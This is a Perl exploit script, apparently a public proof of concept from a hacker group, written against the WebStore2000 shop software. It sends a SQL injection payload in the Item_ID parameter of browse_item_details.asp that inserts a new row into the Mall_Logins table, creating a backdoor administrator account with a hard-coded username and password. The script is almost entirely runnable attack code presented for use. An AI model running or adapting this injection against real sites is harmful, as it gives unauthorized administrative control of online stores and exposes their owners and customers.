#!/usr/bin/perl -w
#This exploit create user with Mall Admin priv.
#You can login via /MallAdmin/
$pamer = "
1ndonesian Security Team (1st)
==============================
http://bosen.net/releases/

ws2k-ex.pl, WebStore2000 SQL Injection Proof of Concept
Exploit by  : Bosen
Discover by : Bosen
Greetz to   : AresU, TioEuy, syzwz, TioEuy, sakitjiwa, muthafuka
              all #hackers\@centrin.net.id/austnet.org";

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;
$| = 1;
print $pamer;
if ($#ARGV<3){
  print "\n Usage: perl ws2k-ex.pl <uri>\n\n";
  exit;
}
my $legend  = "$ARGV[0]/browse_item_details.asp?Item_ID=";
$legend    .= "''; insert into Mall_Logins values ('bosen','gembel')--";

my $bosen  = LWP::UserAgent->new();
my $gembel = HTTP::Request->new(GET => $legend);
my $dodol  = $bosen->request($gembel);
if ($dodol->is_error()) { printf " %s\n", $dodol->status_line;
} else { print "Alhamdulillah :P\n"; }
print "\n680165\n";
